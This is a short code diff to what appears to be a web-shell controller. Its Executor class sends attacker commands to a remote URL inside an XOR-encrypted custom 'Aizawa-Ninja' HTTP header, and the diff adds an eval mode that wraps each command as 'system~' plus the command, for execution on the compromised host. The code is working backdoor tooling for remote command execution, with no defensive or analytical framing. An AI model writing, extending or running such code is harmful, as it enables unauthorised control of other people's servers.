@@ -14,7 +14,11 @@ class Executor:
     @staticmethod
     async def execute(client: HttpClient, url: str, cmd: str, type: str, key: str) -> Optional[str]:
         if type.startswith("http_aizawa_ninja"):
-            encrypted_cmd = Executor.xor_encrypt(cmd, key)
+            if type == "http_aizawa_ninja_eval":
+                encrypted_cmd = Executor.xor_encrypt(f"system~{cmd}", key)
+            else:
+                encrypted_cmd = Executor.xor_encrypt(cmd, key)
+
             headers = {"Aizawa-Ninja": encrypted_cmd}
             result = await client.request("GET", url, headers=headers)
 
